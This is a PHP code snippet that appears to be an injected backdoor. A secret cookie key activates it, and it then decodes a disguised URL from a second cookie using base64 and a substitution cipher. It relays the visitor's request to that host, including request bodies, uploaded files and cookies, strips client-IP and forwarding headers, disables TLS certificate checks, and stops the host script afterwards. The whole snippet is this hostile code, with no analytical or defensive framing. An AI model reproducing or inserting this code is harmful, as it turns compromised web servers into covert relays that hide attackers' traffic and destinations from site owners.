if (@$_COOKIE["_k"] == "INSERT_KEY") {
	if (!defined("MIDNIGHT")) {
		define("MIDNIGHT", 1);
		function _request($url, $method, $body = null, $headers = null)
		{
			if (!function_exists("curl_exec")) {
				if(ini_get("allow_url_fopen")) {
					$opts_array = array(
						"method" => $method,
						"ignore_errors" => true,
					);
					if ($headers !== null) $opts_array["header"] = $headers;
					if ($method !== "GET" && $body !== null) {
						$opts_array["content"] = $body;
					}
					$opts = array("http" => $opts_array);
					$context = stream_context_create($opts);
					$req = file_get_contents($url, false, $context);
					$response = array();
					$response["body"] = $req;
					$response["headers"] = $http_response_header;
					return $response;
				} else {
					return false;
				}
			}

			$ch = curl_init();

			if ($method === "POST") {
				curl_setopt($ch, CURLOPT_POST, 1);
				if ($body !== null) {
					curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
				}
			}

			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_AUTOREFERER, true);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_TIMEOUT, 300);
			curl_setopt($ch, CURLOPT_HEADER, true);

			if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			$req = curl_exec($ch);
			if ($req !== false) {
				$response = array();
				$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
				$response["headers"] = array_filter(
					explode("\r\n", substr($req, 0, $header_size)),
					function($x) { 
						return !(empty($x)) && strpos(strtolower($x), "transfer-encoding") === false; 
					}
				);
				$response["body"] = substr($req, $header_size);
				return $response;
			} else {
				return false;
			}
		}

		if (!function_exists("getallheaders"))  {
			function getallheaders()
			{
			    if (!is_array($_SERVER)) {
			        return array();
			    }
			    $headers = array();
			    foreach ($_SERVER as $name => $value) {
			        if (substr($name, 0, 5) == "HTTP_") {
			            $headers[str_replace(" ", "-", ucwords(strtolower(str_replace("_", " ", substr($name, 5)))))] = $value;
			        }
			    }
			    return $headers;
			}
		}
		function buildMultipart($boundary, $fields, $files) {
	    	$data = '';
	    	$eol = "\r\n";

	    	$delimiter = '-------------' . $boundary;

	    	foreach ($fields as $name => $content) {
	    	    $data .= "--" . $delimiter . $eol
	    	        . 'Content-Disposition: form-data; name="' . $name . "\"".$eol.$eol
	    	        . $content . $eol;
	    	}

	    	foreach ($files as $name => $f) {
	    	    $data .= "--" . $delimiter . $eol
	    	        . 'Content-Disposition: form-data; name="' . $name . '"; filename="' . $f["name"] . '"' . $eol
	    	        . 'Content-Type: ' . $f["type"] .$eol;

	    	    $data .= $eol;
	    	    $data .= file_get_contents($f["tmp_name"]) . $eol;
	    	}
			$data .= "--" . $delimiter . "--".$eol;

			return $data;
		}
		$assoc_headers = getallheaders();
		if (strpos(@$assoc_headers["Content-Type"], "multipart/form-data") !== false) {
			$fields = array();
			if (!empty($_POST)) {
				$fields = $_POST;
			}
			$boundary = uniqid();
			$delimiter = "-------------" . $boundary;
			$files = array();
			if (!empty($_FILES)) {
				$files = $_FILES;
			}
			$body = buildMultipart($boundary, $fields, $files);
		} else {
			$body = file_get_contents("php://input");
		}
		$headers = array();
		$url = strtr(base64_decode($_COOKIE["_u"]), "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_:/?&=-%", "Z/zbluXpMj:?LImUD7rknPQEBef6iwJgR1-C%W5aH902GSN&O4dVKTxq3AYF8_c=vothys");
		$url_parts = parse_url($url);
		foreach ($assoc_headers as $key => $value) {
			switch (strtolower($key)) {
				case "host":
					$headers []= "Host: " . $url_parts["host"];
					break;
				case "cookie":
					$cookies = $_COOKIE;
					unset($cookies["_u"]);
					unset($cookies["_k"]);
					if (!empty($cookies)) {
						$i = 0;
						$items_count = count($cookies);
						$cookies_str = "";
						foreach ($cookies as $k => $v) {
							$cookies_str .= "$k=$v";
							if (++$i !== $items_count) {
								$cookies_str .= "; ";
							}
						}
						$headers []= "Cookie: $cookies_str";
					}
					break;
				case "client-ip":
				case "x-forwarded-for":
				case "cf-connecting-ip":
				case "x-cluster-client-ip":
				case "x-forwarded":
				case "forwarded-for":
				case "forwarded":
				case "remote-ip":
				case "x-predictor":
					break;
				case "content-type":
					if (strpos($assoc_headers["Content-Type"], "multipart/form-data") !== false) {
						$headers []= "Content-Type: multipart/form-data; boundary=" . $delimiter;
						break;
					}
				case "content-length":
					if (strpos($assoc_headers["Content-Type"], "multipart/form-data") !== false) {
						$headers []= "Content-Length: " . mb_strlen($body);
						break;
					}
				default:
					$headers []= "$key: $value";
					break;
			}
		}
		$req = _request($url, $_SERVER["REQUEST_METHOD"], $body ? $body : null, $headers);
		if ($req) {
			foreach ($req["headers"] as $header) header($header);
			echo $req["body"];
		} else {
			header("HTTP/1.1 202 Accepted");
		}
		if ('.inc' === basename(__FILE__)) { throw new Exception('die'); } else { die(); };
	}
}
